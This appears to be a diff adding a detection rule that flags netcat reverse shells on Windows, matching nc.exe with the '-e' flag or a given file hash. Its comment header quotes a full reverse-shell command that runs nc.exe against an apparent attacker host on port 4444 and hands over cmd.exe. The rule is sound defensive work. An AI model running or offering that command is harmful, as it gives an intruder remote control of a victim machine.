@@ -1,0 +1,14 @@
+# Image: nc.exe
+# Command Line: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe
+# MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38
+
+title: Netcat Reverse Shell
+description: netcat_reverse_shell
+detection:
+    selection1:
+        EventID: 1
+        Image|endswith: 'nc.exe'
+        CommandLine|contains: ' -e '
+    selection2:
+        Hashes|contains: '523613A7B9DFA398CBD5EBD2DD0F4F38'
+    condition: selection1 or selection2
